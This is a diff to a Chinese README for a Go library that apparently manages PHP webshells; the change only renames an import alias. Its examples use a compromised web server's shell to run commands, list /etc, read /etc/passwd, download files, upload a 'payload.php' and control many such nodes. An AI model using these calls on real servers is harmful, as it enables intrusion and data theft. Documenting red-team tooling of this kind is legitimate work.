@@ -22,7 +22,7 @@ import (
     "time"
 
     "github.com/Yliken/redbeanshellcore/core"
-    phpshell "github.com/Yliken/redbeanshellcore/adapter/php"
+    "github.com/Yliken/redbeanshellcore/adapter/php"
     "github.com/Yliken/redbeanshellcore/registry/memory"
     "github.com/Yliken/redbeanshellcore/transport/httpform"
 )
@@ -46,7 +46,7 @@ func main() {
     )
 
     // 获取系统信息
-    res, _ := client.Do(ctx, phpshell.NewPhpInfo())
+    res, _ := client.Do(ctx, php.NewPhpInfo())
     info := res.(*core.InfoResult)
     fmt.Printf("workdir=%s\nos=%s\nuser=%s\n", info.Workdir, info.OS, info.User)
 }
@@ -63,7 +63,7 @@ user=www-data
 ## 3. 执行命令
 
 ```go
-res, _ := client.Do(ctx, phpshell.NewPhpExec("whoami"))
+res, _ := client.Do(ctx, php.NewPhpExec("whoami"))
 er := res.(*core.ExecResult)
 fmt.Println(er.Stdout)
 ```
@@ -72,25 +72,25 @@ fmt.Println(er.Stdout)
 
 ```go
 // 列目录
-res, _ := client.Do(ctx, phpshell.NewPhpFileList("/etc"))
+res, _ := client.Do(ctx, php.NewPhpFileList("/etc"))
 flr := res.(*core.FileListResult)
 for _, e := range flr.Entries {
     fmt.Printf("%s\n", e.Name)
 }
 
 // 读文件
-res, _ := client.Do(ctx, phpshell.NewPhpFileRead("/etc/passwd"))
+res, _ := client.Do(ctx, php.NewPhpFileRead("/etc/passwd"))
 frr := res.(*core.FileReadResult)
 fmt.Println(string(frr.Data))
 
 // 下载二进制文件
-res, _ = client.Do(ctx, phpshell.NewPhpFileDownload("/tmp/data.bin"))
+res, _ = client.Do(ctx, php.NewPhpFileDownload("/tmp/data.bin"))
 download := res.(*core.FileReadResult)
 os.WriteFile("./data.bin", download.Data, 0600)
 
 // 上传文件
 data, _ := os.ReadFile("./local-payload.php")
-res, _ = client.Do(ctx, phpshell.NewPhpFileUpload("/tmp/payload.php", data))
+res, _ = client.Do(ctx, php.NewPhpFileUpload("/tmp/payload.php", data))
 up := res.(*core.BoolResult)
 fmt.Println(up.OK) // true 表示成功
 ```
@@ -98,7 +98,7 @@ fmt.Println(up.OK) // true 表示成功
 ## 5. 多节点管理
 
 ```go
-mgr := core.NewManager(memory.New(), phpshell.NewClientFactory())
+mgr := core.NewManager(memory.New(), php.NewClientFactory())
 
 // 注册节点
 mgr.Register(ctx, core.NodeConfig{
@@ -115,7 +115,7 @@ cli, _ := mgr.Client(ctx, "lab-a")
 nodes, _ := mgr.List(ctx, core.NodeFilter{Group: "case-001"})
 for _, n := range nodes {
     c, _ := mgr.Client(ctx, n.Config.ID)
-    c.Do(ctx, phpshell.NewPhpInfo())
+    c.Do(ctx, php.NewPhpInfo())
 }
 ```
 
@@ -150,7 +150,7 @@ Middleware 能观察 HTTP 状态、响应解码和 Operation.Parse 的最终错�
 
 | 问题 | 原因 | 解决 |
 |------|------|------|
-| `workdir= os= user=` 全空 | 用了 `ops.NewInfo()` | 换成 `phpshell.NewPhpInfo()` |
-| `sh: 1: -c: not found` | bin 路径为空 | 用 `phpshell.NewPhpExec(cmd)` |
+| `workdir= os= user=` 全空 | 用了 `ops.NewInfo()` | 换成 `php.NewPhpInfo()` |
+| `sh: 1: -c: not found` | bin 路径为空 | 用 `php.NewPhpExec(cmd)` |
 | `transport 未配置` | Client 没有配置 Transport | 使用 `core.WithTransport(...)`；Manager 使用可用的自定义 ClientFactory |
 | `ErrPolicyDenied` | readonly 拦截 | 正常行为，写操作被阻止 |
